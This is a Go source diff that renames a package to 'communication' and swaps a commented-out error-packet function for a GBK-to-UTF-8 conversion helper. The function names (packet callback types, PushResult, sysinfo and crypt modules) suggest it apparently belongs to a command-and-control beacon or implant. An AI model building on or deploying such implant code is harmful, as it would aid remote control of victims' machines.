@@ -1,10 +1,13 @@
-package packet
+package communication
 
 import (
 	"bytes"
 	"crypto/sha256"
 	"encoding/binary"
 	"fmt"
+	"golang.org/x/text/encoding/simplifiedchinese"
+	"golang.org/x/text/transform"
+	"io/ioutil"
 	"main/config"
 	"main/crypt"
 	"main/sysinfo"
@@ -13,6 +16,7 @@ import (
 	"strings"
 	"sync"
 	"time"
+	"unicode/utf8"
 )
 
 var (
@@ -297,14 +301,14 @@ func criticalSection(callbackType int, b []byte) ([]byte, error) {
 	return result, err
 }
 
-/*
-func processError(err string) {
-	errIdBytes := WriteInt(0) // must be zero
-	arg1Bytes := WriteInt(0)  // for debug
-	arg2Bytes := WriteInt(0)
-	errMsgBytes := []byte(err)
-	result := util.BytesCombine(errIdBytes, arg1Bytes, arg2Bytes, errMsgBytes)
-	finalPaket := MakePacket(31, result)
-	PushResult(finalPaket)
+func CodepageToUTF8(b []byte) ([]byte, error) {
+	if !utf8.Valid(b) {
+		reader := transform.NewReader(bytes.NewReader(b), simplifiedchinese.GBK.NewDecoder())
+		d, e := ioutil.ReadAll(reader)
+		if e != nil {
+			return nil, e
+		}
+		return d, nil
+	}
+	return b, nil
 }
-*/
